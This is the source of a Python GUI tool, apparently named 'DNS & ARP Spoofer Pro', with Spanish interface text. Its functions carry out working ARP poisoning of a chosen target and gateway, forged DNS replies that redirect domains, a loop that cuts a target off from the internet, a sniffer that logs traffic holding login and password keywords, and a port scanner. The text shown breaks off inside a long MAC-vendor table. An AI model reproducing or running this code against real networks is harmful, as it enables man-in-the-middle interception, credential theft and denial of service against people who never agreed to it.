import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, Toplevel, filedialog
from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSRR, IP, UDP, conf, get_if_addr, TCP, Raw, ICMP
import threading
import time
import netifaces
import sys
import io
import re
import socket
import subprocess
from datetime import datetime
import os
import platform
import webbrowser
from PIL import Image, ImageTk

VERSION = "1.0"
AUTHOR = "M-Society"
LICENSE = "OPEN SOURCE"
RELEASE_DATE = "2025-20-07"

class GlobalState:
    def __init__(self):
        self.target_ip = ""
        self.gateway_ip = ""
        self.attacker_ip = ""
        self.target_mac = ""
        self.gateway_mac = ""
        self.fake_domains = {}
        self.arp_thread = None
        self.sniffing_active = False
        self.discovery_hosts = []
        self.status = "ready"  
        self.credential_sniffer_active = False
        self.packet_count = 0
        self.start_time = None
        self.interface = conf.iface
        self.dark_mode = True
        self.log_file = None
        self.auto_restore = True
        self.protection_active = False
        self.blocked_ips = set()

state = GlobalState()

class NetworkUtils:
    @staticmethod
    def get_local_ip():
        try:
            return get_if_addr(state.interface)
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo obtener la IP local: {str(e)}")
            return "127.0.0.1"

    @staticmethod
    def get_gateway():
        try:
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo obtener el gateway: {str(e)}")
            return None

    @staticmethod
    def get_mac(ip):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            result = srp(broadcast / arp_request, timeout=3, verbose=False)[0]
            return result[0][1].hwsrc if result else None
        except Exception as e:
            print(f"[-] Error obteniendo MAC para {ip}: {str(e)}")
            return None

    @staticmethod
    def validate_ip(ip):
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        return re.match(pattern, ip) is not None

    @staticmethod
    def validate_domain(domain):
        pattern = r'^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$'
        return re.match(pattern, domain) is not None

    @staticmethod
    def get_network_interfaces():
        return sorted(conf.ifaces.keys())

    @staticmethod
    def ping(ip):
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '1', ip]
        return subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

class SecurityUtils:
    @staticmethod
    def enable_ip_forwarding():
        if platform.system() == "Linux":
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        elif platform.system() == "Windows":
            os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
        print("[+] IP forwarding habilitado")

    @staticmethod
    def disable_ip_forwarding():
        if platform.system() == "Linux":
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        elif platform.system() == "Windows":
            os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
        print("[+] IP forwarding deshabilitado")

    @staticmethod
    def arp_protection():
        while state.protection_active:
            real_gateway_mac = NetworkUtils.get_mac(state.gateway_ip)
            if real_gateway_mac and real_gateway_mac != state.gateway_mac:
                print(f"[!] ALERTA: ARP Spoof detectado! Gateway MAC cambiado a {real_gateway_mac}")
                state.gateway_mac = real_gateway_mac
            time.sleep(5)

def advanced_arp_spoof():
    print(f"[+] Iniciando ARP spoofing entre {state.target_ip} y {state.gateway_ip}")
    state.start_time = datetime.now()
    
    while state.sniffing_active:
        try:
            send(ARP(op=2, pdst=state.target_ip, psrc=state.gateway_ip, hwdst=state.target_mac), verbose=False)
            send(ARP(op=2, pdst=state.gateway_ip, psrc=state.target_ip, hwdst=state.gateway_mac), verbose=False)
            
            send(ARP(op=2, pdst=state.target_ip, psrc=state.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
            
            state.packet_count += 3
            update_stats()
            time.sleep(1.5)  
        except Exception as e:
            print(f"[-] Error en ARP spoof: {str(e)}")
            time.sleep(5)

def restore_arp():
    print("[+] Restaurando tablas ARP...")
    try:
        send(ARP(op=2, pdst=state.gateway_ip, psrc=state.target_ip, hwsrc=state.target_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
        send(ARP(op=2, pdst=state.target_ip, psrc=state.gateway_ip, hwsrc=state.gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
        print("[+] Tablas ARP restauradas correctamente")
    except Exception as e:
        print(f"[-] Error restaurando ARP: {str(e)}")

def dns_spoof(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        domain = packet[DNS].qd.qname
        for fake_domain in state.fake_domains:
            if fake_domain in domain.decode().lower():
                print(f"[+] Interceptado: {packet[IP].src} solicitó {domain.decode()}")
                
                spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                             UDP(dport=packet[UDP].sport, sport=53) / \
                             DNS(id=packet[DNS].id, 
                                 qr=1, 
                                 aa=1, 
                                 rd=0, 
                                 qd=packet[DNS].qd,
                                 an=DNSRR(rrname=domain, 
                                         ttl=600, 
                                         rdata=state.fake_domains[fake_domain]))
                
                send(spoofed_pkt, verbose=False)
                print(f"[+] Redirigido {domain.decode()} a {state.fake_domains[fake_domain]}")
                break

def block_internet():
    print(f"[!] Bloqueando internet para {state.target_ip}")
    state.start_time = datetime.now()
    
    while state.sniffing_active:
        try:
            send(ARP(op=2, pdst=state.target_ip, psrc=state.gateway_ip, hwdst=state.target_mac), verbose=False)
            
            send(IP(dst=state.target_ip)/ICMP(type=3, code=1), verbose=False)
            
            state.packet_count += 2
            update_stats()
            time.sleep(2)
        except Exception as e:
            print(f"[-] Error en bloqueo: {str(e)}")
            time.sleep(5)

def start_sniffing():
    print("[+] Iniciando sniffer DNS...")
    sniff(filter="udp port 53", prn=dns_spoof, store=0, iface=state.interface)

def credential_sniffer():
    print("[+] Iniciando sniffer de credenciales...")
    
    def analyze_packet(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                load = packet[Raw].load.decode('utf-8', errors='ignore').lower()
                
                # Detección mejorada de credenciales
                if any(keyword in load for keyword in ["user", "pass", "login", "pwd", "password"]):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    log_entry = f"\n[!] Credencial potencial capturada ({timestamp}) [{src_ip} -> {dst_ip}]:\n{load}\n"
                    print(log_entry)
                    
                    if state.log_file:
                        with open(state.log_file, 'a') as f:
                            f.write(log_entry)
            except Exception as e:
                pass
    
    sniff(filter="tcp port 80 or tcp port 21 or tcp port 22 or tcp port 443", 
          prn=analyze_packet, 
          store=0, 
          iface=state.interface)

def port_scan(target_ip, ports="1-1024"):
    print(f"[~] Escaneando puertos {ports} en {target_ip}...")
    try:
        start_port, end_port = map(int, ports.split('-'))
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"[+] Puerto {port} abierto")
            sock.close()
    except Exception as e:
        print(f"[-] Error en escaneo de puertos: {str(e)}")

class ModernUI:
    def __init__(self, root):
        self.root = root
        self.root.title(f"DNS & ARP Spoofer Pro v{VERSION} - {AUTHOR}")
        self.root.geometry("1000x800")
        self.root.minsize(900, 700)
        self.root.configure(bg="#121212")
        
        self.style = ttk.Style()
        self.setup_styles()
        
        try:
            self.root.iconbitmap("icon.ico")
        except:
            pass
        
        self.setup_menu()
        
        self.setup_status_bar()
        
        self.setup_main_panel()
        
        self.setup_control_panel()
        
        self.setup_output_panel()
        
        self.setup_stats_panel()
        
        if state.auto_restore:
            self.root.protocol("WM_DELETE_WINDOW", self.safe_exit)

    def setup_styles(self):
        self.style.theme_create("m-society", settings={
            "TFrame": {
                "configure": {"background": "#121212"}
            },
            "TLabel": {
                "configure": {
                    "background": "#121212",
                    "foreground": "#e0e0e0",
                    "font": ("Segoe UI", 10)
                }
            },
            "TButton": {
                "configure": {
                    "background": "#333",
                    "foreground": "#fff",
                    "font": ("Segoe UI", 10),
                    "borderwidth": 1,
                    "relief": "flat",
                    "padding": 5
                },
                "map": {
                    "background": [("active", "#444"), ("disabled", "#222")],
                    "foreground": [("disabled", "#777")]
                }
            },
            "TEntry": {
                "configure": {
                    "fieldbackground": "#252525",
                    "foreground": "#fff",
                    "insertcolor": "#fff",
                    "font": ("Consolas", 10),
                    "borderwidth": 1,
                    "relief": "flat"
                }
            },
            "TCombobox": {
                "configure": {
                    "fieldbackground": "#252525",
                    "foreground": "#fff",
                    "background": "#252525",
                    "selectbackground": "#444",
                    "selectforeground": "#fff",
                    "font": ("Consolas", 10),
                    "borderwidth": 1,
                    "relief": "flat"
                }
            },
            "TNotebook": {
                "configure": {
                    "background": "#121212",
                    "tabmargins": [2, 5, 2, 0]
                }
            },
            "TNotebook.Tab": {
                "configure": {
                    "background": "#252525",
                    "foreground": "#aaa",
                    "padding": [10, 5],
                    "font": ("Segoe UI", 9)
                },
                "map": {
                    "background": [("selected", "#333")],
                    "foreground": [("selected", "#fff")]
                }
            }
        })
        self.style.theme_use("m-society")

    def setup_menu(self):
        menubar = tk.Menu(self.root, bg="#252525", fg="#fff", activebackground="#444", activeforeground="#fff")
        
        file_menu = tk.Menu(menubar, tearoff=0, bg="#252525", fg="#fff", activebackground="#444")
        file_menu.add_command(label="Guardar log", command=self.save_log)
        file_menu.add_command(label="Cargar configuración", command=self.load_config)
        file_menu.add_command(label="Guardar configuración", command=self.save_config)
        file_menu.add_separator()
        file_menu.add_command(label="Salir", command=self.safe_exit)
        menubar.add_cascade(label="Archivo", menu=file_menu)
        
        tools_menu = tk.Menu(menubar, tearoff=0, bg="#252525", fg="#fff", activebackground="#444")
        tools_menu.add_command(label="Interceptar credenciales", command=self.start_credential_sniffer)
        tools_menu.add_command(label="Escaneo de puertos", command=self.open_port_scanner)
        tools_menu.add_command(label="Analizador de red", command=self.open_network_analyzer)
        menubar.add_cascade(label="Herramientas", menu=tools_menu)
        
        
        config_menu = tk.Menu(menubar, tearoff=0, bg="#252525", fg="#fff", activebackground="#444")
        config_menu.add_checkbutton(label="Auto-restaurar ARP", variable=tk.BooleanVar(value=state.auto_restore), command=self.toggle_auto_restore)
        config_menu.add_checkbutton(label="Modo oscuro", variable=tk.BooleanVar(value=state.dark_mode), command=self.toggle_dark_mode)
        config_menu.add_command(label="Seleccionar interfaz", command=self.select_interface)
        menubar.add_cascade(label="Configuración", menu=config_menu)
        
         
        help_menu = tk.Menu(menubar, tearoff=0, bg="#252525", fg="#fff", activebackground="#444")
        help_menu.add_command(label="Documentación", command=self.open_docs)
        help_menu.add_command(label="Acerca de", command=self.show_about)
        menubar.add_cascade(label="Ayuda", menu=help_menu)
        
        self.root.config(menu=menubar)

    def setup_status_bar(self):
        status_frame = ttk.Frame(self.root)
        status_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=5, pady=5)
        
        self.status_label = ttk.Label(status_frame, text="Listo", foreground="#0f0")
        self.status_label.pack(side=tk.LEFT, padx=5)
        
        self.interface_label = ttk.Label(status_frame, text=f"Interfaz: {state.interface}")
        self.interface_label.pack(side=tk.LEFT, padx=20)
        
        self.protection_label = ttk.Label(status_frame, text="Protección: OFF", foreground="#f00")
        self.protection_label.pack(side=tk.RIGHT, padx=5)
        
        self.time_label = ttk.Label(status_frame, text="")
        self.time_label.pack(side=tk.RIGHT, padx=20)

    def setup_main_panel(self):
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        config_tab = ttk.Frame(notebook)
        notebook.add(config_tab, text="Configuración")
        
        target_frame = ttk.LabelFrame(config_tab, text="Objetivo")
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(target_frame, text="IP del objetivo:").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.target_entry = ttk.Entry(target_frame)
        self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        ttk.Button(target_frame, text="Obtener de selección", command=self.get_selected_host).grid(row=0, column=2, padx=5)
        
        ttk.Label(target_frame, text="Dominios a spoofear (separados por coma):").grid(row=1, column=0, padx=5, pady=5, sticky="e")
        self.domain_entry = ttk.Entry(target_frame)
        self.domain_entry.grid(row=1, column=1, columnspan=2, padx=5, pady=5, sticky="ew")
        
        discovery_frame = ttk.LabelFrame(config_tab, text="Descubrimiento de red")
        discovery_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.host_list = tk.Listbox(discovery_frame, bg="#252525", fg="#fff", selectbackground="#444", font=("Consolas", 10))
        self.host_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        scrollbar = ttk.Scrollbar(discovery_frame, orient="vertical", command=self.host_list.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.host_list.config(yscrollcommand=scrollbar.set)
        
        self.host_list.bind('<<ListboxSelect>>', self.on_host_select)

    def setup_control_panel(self):
        control_frame = ttk.Frame(self.root)
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(control_frame, text="Escanear red", command=self.scan_network).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Iniciar Spoofing", command=self.start_attack).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Bloquear Internet", command=self.block_internet).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Detener todo", command=self.stop_attack).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Protección ARP", command=self.toggle_protection).pack(side=tk.RIGHT, padx=5)

    def setup_output_panel(self):
        output_frame = ttk.LabelFrame(self.root, text="Salida")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.output_text = scrolledtext.ScrolledText(output_frame, bg="#252525", fg="#0f0", font=("Consolas", 10))
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.output_text.config(state=tk.DISABLED)
        
        sys.stdout = RedirectText(self.output_text)

    def setup_stats_panel(self):
        stats_frame = ttk.Frame(self.root)
        stats_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(stats_frame, text="Paquetes enviados:").pack(side=tk.LEFT, padx=10)
        self.packet_count_label = ttk.Label(stats_frame, text="0")
        self.packet_count_label.pack(side=tk.LEFT, padx=5)
        
        ttk.Label(stats_frame, text="Tiempo activo:").pack(side=tk.LEFT, padx=10)
        self.uptime_label = ttk.Label(stats_frame, text="00:00:00")
        self.uptime_label.pack(side=tk.LEFT, padx=5)
        
        ttk.Label(stats_frame, text="Estado:").pack(side=tk.LEFT, padx=10)
        self.state_label = ttk.Label(stats_frame, text="Inactivo")
        self.state_label.pack(side=tk.LEFT, padx=5)

    def print_output(self, text):
        self.output_text.config(state=tk.NORMAL)
        self.output_text.insert(tk.END, text + "\n")
        self.output_text.see(tk.END)
        self.output_text.config(state=tk.DISABLED)
        
        if state.log_file:
            with open(state.log_file, 'a') as f:
                f.write(text + "\n")

    def update_stats(self):
        self.packet_count_label.config(text=str(state.packet_count))
        
        if state.start_time:
            uptime = datetime.now() - state.start_time
            self.uptime_label.config(text=str(uptime).split('.')[0])
        
        self.root.after(1000, self.update_stats)

    def update_clock(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.time_label.config(text=now)
        self.root.after(1000, self.update_clock)

    def on_host_select(self, event):
        selection = self.host_list.curselection()
        if selection:
            selected_ip = state.discovery_hosts[selection[0]][0]
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, selected_ip)
            self.print_output(f"[*] IP seleccionada: {selected_ip}")

    def get_selected_host(self):
        selection = self.host_list.curselection()
        if selection:
            selected_ip = state.discovery_hosts[selection[0]][0]
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, selected_ip)
            self.print_output(f"[*] IP seleccionada: {selected_ip}")
        else:
            messagebox.showwarning("Advertencia", "No se ha seleccionado ningún host")

    def scan_network(self):
        def do_scan():
            state.status = "scanning"
            self.state_label.config(text="Escaneando...")
            self.print_output("[~] Iniciando escaneo de red...")
            
            state.discovery_hosts.clear()
            self.host_list.delete(0, tk.END)
            
            ip_base = ".".join(NetworkUtils.get_local_ip().split(".")[:-1]) + ".1/24"
            
            try:
                arp = ARP(pdst=ip_base)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = ether / arp
                
                result = srp(packet, timeout=3, verbose=False, iface=state.interface)[0]
                
                if not result:
                    self.print_output("[!] No se encontraron hosts en la red")
                    return
                
                self.print_output(f"[+] {len(result)} hosts encontrados:")
                
                for sent, received in result:
                    ip_mac = f"{received.psrc} - {received.hwsrc}"
                    vendor = self.get_mac_vendor(received.hwsrc[:8].upper())
                    
                    self.host_list.insert(tk.END, f"{ip_mac} ({vendor})")
                    state.discovery_hosts.append((received.psrc, received.hwsrc))
                    self.print_output(f"    {ip_mac} ({vendor})")
                
                self.print_output("[+] Escaneo completado")
                
            except Exception as e:
                self.print_output(f"[-] Error en escaneo: {str(e)}")
            finally:
                state.status = "ready"
                self.state_label.config(text="Inactivo")
        
        threading.Thread(target=do_scan, daemon=True).start()

    def get_mac_vendor(self, mac_prefix):
        # Base de datos simple de vendors (podría extenderse o cargar desde archivo) puedes buscar mas worlits, o algo, y agregarlas o modificar el script para q lo tome desde un archivo extero
        vendors = {
            "00:00:0C": "Cisco",
            "00:1A:11": "Dell",
            "00:50:56": "VMware",
            "00:16:3E": "Xensource",
            "00:0F:4B": "Hewlett-Packard",
            "00:1C:C4": "Apple",
            "00:26:BB": "Apple",
            "00:25:BC": "Apple",
            "00:23:12": "Intel",
            "00:1D:72": "Intel",
            "00:19:B9": "D-Link",
            "00:1B:11": "TP-Link",
            "00:1E:8C": "Samsung",
            "00:24:90": "Samsung",
            "00:0D:4B": "ASUSTeK",
            "00:1A:92": "ASUSTeK",
            "00:1F:16": "ASUSTeK",
            "00:0C:29": "VMware",
            "00:1F:3A": "Sony",
            "00:26:4A": "Sony",
            "00:13:72": "Microsoft",
            "00:15:5D": "Microsoft",
            "00:17:FA": "Microsoft",
            "00:1D:60": "Microsoft",
            "00:21:5A": "Microsoft",
            "00:22:48": "Microsoft",
            "00:25:AE": "Microsoft",
            "00:26:18": "Microsoft",
            "00:50:F2": "Microsoft",
            "00:03:FF": "Microsoft",
            "00:12:5A": "Microsoft",
            "00:14:5A": "Microsoft",
            "00:15:5D": "Microsoft Hyper-V",
            "00:0F:FE": "SMSC",
            "00:1E:68": "HTC",
            "00:23:76": "HTC",
            "00:25:41": "HTC",
            "00:26:5D": "HTC",
            "00:17:83": "LG Electronics",
            "00:1E:75": "LG Electronics",
            "00:21:FB": "LG Electronics",
            "00:26:37": "LG Electronics",
            "00:1C:62": "Motorola",
            "00:23:DF": "Motorola",
            "00:26:7F": "Motorola",
            "00:0A:27": "Apple",
            "00:0D:93": "Apple",
            "00:03:93": "Apple",
            "00:05:02": "Apple",
            "00:05:03": "Apple",
            "00:0A:95": "Apple",
            "00:10:FA": "Apple",
            "00:11:24": "Apple",
            "00:14:51": "Apple",
            "00:16:CB": "Apple",
            "00:17:F2": "Apple",
            "00:19:E3": "Apple",
            "00:1A:70": "Apple",
            "00:1B:63": "Apple",
            "00:1C:B3": "Apple",
            "00:1D:4F": "Apple",
            "00:1E:52": "Apple",
            "00:1F:5B": "Apple",
            "00:1F:F3": "Apple",
            "00:21:E9": "Apple",
            "00:22:41": "Apple",
            "00:23:12": "Apple",
            "00:23:32": "Apple",
            "00:23:6C": "Apple",
            "00:23:DF": "Apple",
            "00:24:36": "Apple",
            "00:25:00": "Apple",
            "00:25:BC": "Apple",
            "00:26:08": "Apple",
            "00:26:4A": "Apple",
            "00:26:B0": "Apple",
            "00:26:BB": "Apple",
            "00:30:65": "Apple",
            "00:3E:E1": "Apple",
            "00:50:E4": "Apple",
            "00:56:CD": "Apple",
            "00:60:2F": "Apple",
            "00:6D:52": "Apple",
            "00:7D:60": "Apple",
            "00:88:65": "Apple",
            "00:A0:40": "Apple",
            "00:CD:FE": "Apple",
            "04:15:52": "Apple",
            "04:1E:64": "Apple",
            "04:26:65": "Apple",
            "04:48:9A": "Apple",
            "04:54:53": "Apple",
            "04:DB:56": "Apple",
            "04:F7:E4": "Apple",
            "08:00:07": "Apple",
            "08:66:98": "Apple",
            "08:70:45": "Apple",
            "0C:30:21": "Apple",
            "0C:3E:9F": "Apple",
            "0C:4D:E9": "Apple",
            "0C:74:C2": "Apple",
            "0C:77:1A": "Apple",
            "10:1C:0C": "Apple",
            "10:40:F3": "Apple",
            "10:93:E9": "Apple",
            "10:9A:DD": "Apple",
            "10:DD:B1": "Apple",
            "14:10:9F": "Apple",
            "14:5A:05": "Apple",
            "14:99:E2": "Apple",
            "18:20:32": "Apple",
            "18:34:51": "Apple",
            "18:9E:FC": "Apple",
            "18:AF:61": "Apple",
            "18:E7:F4": "Apple",
            "1C:1A:C0": "Apple",
            "1C:5F:2B": "Apple",
            "1C:AB:A7": "Apple",
            "1C:E6:2B": "Apple",
            "20:3C:AE": "Apple",
            "20:76:8F": "Apple",
            "20:7D:74": "Apple",
            "20:A2:E4": "Apple",
            "20:C9:D0": "Apple",
            "24:1E:EB": "Apple",
            "24:A0:74": "Apple",
            "24:AB:81": "Apple",
            "24:E3:14": "Apple",
            "28:37:37": "Apple",
            "28:6A:B8": "Apple",
            "28:6A:BA": "Apple",
            "28:CF:DA": "Apple",
            "28:CF:E9": "Apple",
            "28:E0:2C": "Apple",
            "28:E1:4C": "Apple",
            "28:E7:94": "Apple",
            "28:ED:6A": "Apple",
            "28:EF:01": "Apple",
            "28:F0:76": "Apple",
            "2C:1F:23": "Apple",
            "2C:B4:3A": "Apple",
            "2C:F0:EE": "Apple",
            "30:10:E4": "Apple",
            "30:63:6B": "Apple",
            "30:90:AB": "Apple",
            "30:F7:C5": "Apple",
            "34:12:98": "Apple",
            "34:15:9E": "Apple",
            "34:36:3B": "Apple",
            "34:51:C9": "Apple",
            "34:A3:95": "Apple",
            "34:C0:59": "Apple",
            "38:0F:4A": "Apple",
            "38:48:4C": "Apple",
            "38:71:DE": "Apple",
            "38:8A:D8": "Apple",
            "38:B5:4D": "Apple",
            "38:C9:86": "Apple",
            "3C:07:54": "Apple",
            "3C:15:C2": "Apple",
            "3C:AB:8E": "Apple",
            "3C:D0:F8": "Apple",
            "3C:E0:72": "Apple",
            "40:30:04": "Apple",
            "40:3C:FC": "Apple",
            "40:6C:8F": "Apple",
            "40:6F:2A": "Apple",
            "40:98:4E": "Apple",
            "40:A6:D9": "Apple",
            "40:B3:95": "Apple",
            "40:D3:2D": "Apple",
            "44:00:10": "Apple",
            "44:2A:60": "Apple",
            "44:4C:0C": "Apple",
            "44:D8:84": "Apple",
            "44:FB:42": "Apple",
            "48:43:7C": "Apple",
            "48:60:BC": "Apple",
            "48:74:6E": "Apple",
            "48:D7:05": "Apple",
            "4C:57:CA": "Apple",
            "4C:74:BF": "Apple",
            "4C:7C:5F": "Apple",
            "4C:8D:79": "Apple",
            "4C:B1:99": "Apple",
            "4C:F2:BF": "Apple",
            "50:32:75": "Apple",
            "50:7A:55": "Apple",
            "50:EA:D6": "Apple",
            "54:26:96": "Apple",
            "54:4E:90": "Apple",
            "54:72:4F": "Apple",
            "54:AE:27": "Apple",
            "54:E4:3A": "Apple",
            "58:1F:AA": "Apple",
            "58:55:CA": "Apple",
            "58:7F:57": "Apple",
            "58:B0:35": "Apple",
            "58:E6:BA": "Apple",
            "5C:59:48": "Apple",
            "5C:8D:4E": "Apple",
            "5C:95:AE": "Apple",
            "5C:96:9D": "Apple",
            "5C:F5:DA": "Apple",
            "60:03:08": "Apple",
            "60:33:4B": "Apple",
            "60:69:44": "Apple",
            "60:6D:C7": "Apple",
            "60:92:17": "Apple",
            "60:C5:47": "Apple",
            "60:D9:C7": "Apple",
            "60:FA:CD": "Apple",
            "60:FB:42": "Apple",
            "64:20:0C": "Apple",
            "64:76:BA": "Apple",
            "64:A3:CB": "Apple",
            "64:B9:E8": "Apple",
            "64:E6:82": "Apple",
            "68:09:27": "Apple",
            "68:5B:35": "Apple",
            "68:96:7B": "Apple",
            "68:9C:70": "Apple",
            "68:A8:6D": "Apple",
            "68:AE:20": "Apple",
            "68:D9:3C": "Apple",
            "68:DB:CA": "Apple",
            "68:FB:7E": "Apple",
            "6C:19:8F": "Apple",
            "6C:3E:6D": "Apple",
            "6C:40:08": "Apple",
            "6C:70:9F": "Apple",
            "6C:72:E7": "Apple",
            "6C:8D:C1": "Apple",
            "6C:94:F8": "Apple",
            "70:11:24": "Apple",
            "70:14:A6": "Apple",
            "70:56:81": "Apple",
            "70:70:0D": "Apple",
            "70:73:CB": "Apple",
            "70:CD:60": "Apple",
            "70:DE:E2": "Apple",
            "70:E7:2C": "Apple",
            "74:1B:B2": "Apple",
            "74:81:14": "Apple",
            "74:8F:1B": "Apple",
            "74:E1:B6": "Apple",
            "74:E2:F5": "Apple",
            "78:31:C1": "Apple",
            "78:3A:84": "Apple",
            "78:4F:43": "Apple",
            "78:6C:1C": "Apple",
            "78:7B:8A": "Apple",
            "78:7E:61": "Apple",
            "78:9F:70": "Apple",
            "78:A3:E4": "Apple",
            "78:CA:39": "Apple",
            "78:D6:F0": "Apple",
            "78:FD:94": "Apple",
            "7C:04:D0": "Apple",
            "7C:11:BE": "Apple",
            "7C:6D:62": "Apple",
            "7C:C3:A1": "Apple",
            "7C:C5:37": "Apple",
            "7C:D1:C3": "Apple",
            "7C:F0:5F": "Apple",
            "7C:FA:DF": "Apple",
            "80:00:6E": "Apple",
            "80:49:71": "Apple",
            "80:92:9F": "Apple",
            "80:BE:05": "Apple",
            "80:D6:05": "Apple",
            "80:EA:96": "Apple",
            "84:29:99": "Apple",
            "84:38:35": "Apple",
            "84:85:06": "Apple",
            "84:8E:0C": "Apple",
            "84:8E:96": "Apple",
            "84:B1:53": "Apple",
            "84:FC:AC": "Apple",
            "84:FC:FE": "Apple",
            "88:1F:A1": "Apple",
            "88:53:95": "Apple",
            "88:63:DF": "Apple",
            "88:66:A5": "Apple",
            "88:87:17": "Apple",
            "88:9F:6F": "Apple",
            "88:C6:63": "Apple",
            "88:CB:87": "Apple",
            "8C:00:6D": "Apple",
            "8C:29:37": "Apple",
            "8C:2D:AA": "Apple",
            "8C:58:77": "Apple",
            "8C:7B:9D": "Apple",
            "8C:7C:92": "Apple",
            "8C:8E:F2": "Apple",
            "8C:8F:E9": "Apple",
            "8C:FA:BA": "Apple",
            "90:27:E4": "Apple",
            "90:60:F1": "Apple",
            "90:72:40": "Apple",
            "90:84:0D": "Apple",
            "90:B2:1F": "Apple",
            "90:B9:31": "Apple",
            "90:C1:C6": "Apple",
            "90:DD:5D": "Apple",
            "94:94:26": "Apple",
            "94:BF:2D": "Apple",
            "94:E9:6A": "Apple",
            "98:00:C6": "Apple",
            "98:03:D8": "Apple",
            "98:0C:82": "Apple",
            "98:10:E8": "Apple",
            "98:5A:EB": "Apple",
            "98:B8:E3": "Apple",
            "98:D6:BB": "Apple",
            "98:E0:D9": "Apple",
            "98:F0:AB": "Apple",
            "9C:04:EB": "Apple",
            "9C:20:7B": "Apple",
            "9C:29:3F": "Apple",
            "9C:35:EB": "Apple",
            "9C:4F:DA": "Apple",
            "9C:84:BF": "Apple",
            "9C:8B:A0": "Apple",
            "9C:E3:3F": "Apple",
            "9C:F3:87": "Apple",
            "9C:F4:8E": "Apple",
            "9C:FC:01": "Apple",
            "A0:18:28": "Apple",
            "A0:3B:E3": "Apple",
            "A0:99:9B": "Apple",
            "A0:ED:CD": "Apple",
            "A4:31:35": "Apple",
            "A4:5E:60": "Apple",
            "A4:67:06": "Apple",
            "A4:B1:97": "Apple",
            "A4:B8:05": "Apple",
            "A4:C3:61": "Apple",
            "A4:D1:8C": "Apple",
            "A4:D1:D2": "Apple",
            "A4:F1:E8": "Apple",
            "A8:20:66": "Apple",
            "A8:5B:78": "Apple",
            "A8:60:B6": "Apple",
            "A8:66:7F": "Apple",
            "A8:86:DD": "Apple",
            "A8:88:08": "Apple",
            "A8:8E:24": "Apple",
            "A8:96:8A": "Apple",
            "A8:BB:CF": "Apple",
            "A8:BE:27": "Apple",
            "A8:FA:D8": "Apple",
            "AC:29:3A": "Apple",
            "AC:3C:0B": "Apple",
            "AC:61:EA": "Apple",
            "AC:7F:3E": "Apple",
            "AC:87:A3": "Apple",
            "AC:BC:32": "Apple",
            "AC:CF:5C": "Apple",
            "AC:FD:EC": "Apple",
            "B0:34:95": "Apple",
            "B0:48:7A": "Apple",
            "B0:65:BD": "Apple",
            "B0:70:2D": "Apple",
            "B0:9F:BA": "Apple",
            "B4:18:D1": "Apple",
            "B4:52:7D": "Apple",
            "B4:52:7E": "Apple",
            "B4:99:4C": "Apple",
            "B4:F0:AB": "Apple",
            "B8:09:8A": "Apple",
            "B8:17:C2": "Apple",
            "B8:44:D9": "Apple",
            "B8:53:AC": "Apple",
            "B8:78:2E": "Apple",
            "B8:8D:12": "Apple",
            "B8:C7:5D": "Apple",
            "B8:E8:56": "Apple",
            "B8:F6:B1": "Apple",
            "BC:3B:AF": "Apple",
            "BC:4C:C4": "Apple",
            "BC:52:B7": "Apple",
            "BC:54:36": "Apple",
            "BC:67:78": "Apple",
            "BC:92:6B": "Apple",
            "BC:9F:EF": "Apple",
            "BC:A9:20": "Apple",
            "BC:EC:5D": "Apple",
            "C0:63:94": "Apple",
            "C0:84:7A": "Apple",
            "C0:9F:42": "Apple",
